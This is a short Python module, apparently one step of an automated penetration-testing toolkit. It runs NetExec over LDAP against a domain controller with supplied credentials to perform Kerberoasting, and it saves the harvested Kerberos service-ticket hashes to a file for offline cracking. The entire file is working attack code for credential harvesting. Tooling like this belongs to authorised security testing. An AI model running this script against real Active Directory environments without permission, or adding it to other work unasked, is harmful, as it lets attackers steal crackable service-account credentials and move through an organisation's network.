#!/usr/bin/env python3
"""Module 15 - Kerberoasting"""

import os
import subprocess


def run(base_dir, dc_ip, target_file, username, password):
    out_dir = os.path.join(base_dir, "kerberos")
    os.makedirs(out_dir, exist_ok=True)

    out_file = os.path.join(out_dir, "hashes.txt")

    cmd = [
        "nxc", "ldap", dc_ip,
        "-u", username,
        "-p", password,
        "--kerberoasting", out_file,
    ]

    result = subprocess.run(
        cmd,
        capture_output=True,
        text=True,
        timeout=300
    )

    if result.returncode != 0:
        raise RuntimeError(
            f"nxc exited with code {result.returncode}\n{result.stderr}"
        )

    return out_file
